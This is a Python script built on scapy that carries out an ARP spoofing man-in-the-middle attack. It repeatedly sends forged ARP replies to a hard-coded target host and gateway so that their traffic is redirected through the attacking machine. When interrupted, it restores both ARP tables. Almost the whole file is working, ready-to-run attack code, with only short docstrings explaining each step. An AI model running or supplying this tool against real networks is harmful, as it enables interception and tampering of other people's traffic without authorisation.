import time
import sys
import  scapy.all as scapy

"""
get_mac(IP) : Function to get mac from IP
-> It will send ARP packet to IP, which will response packet providing its IP and MAC

"""

def get_mac(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcost = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcost = broadcost / arp_request
    answered_list = scapy.srp(arp_request_broadcost, timeout=1, verbose=False)[0]
    if len(answered_list)>=1:
        return answered_list[0][1].hwsrc

"""
spoof(target_ip,spoof_ip) : It will spoof target IP with given IP
-> first it get target mac from target ip
-> send ARP response(including spoof IP) to target even it didn't request, it will accept it

"""
def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

"""
restore(destination_ip,source_ip) : restore to original values
-> uses same logic as in spoof function
"""
def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
if __name__=="__main__":
    target_ip = "10.5.20.121"
    gateway_ip = "10.5.20.1"
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}",end=""),
            sys.stdout.flush()
            time.sleep(2)
    except ConnectionError as ce:
        print(f"\n[-] Connection Error: {ce}\n")
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL+C....Resetting ARP Tables.....Please Wait.\n")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
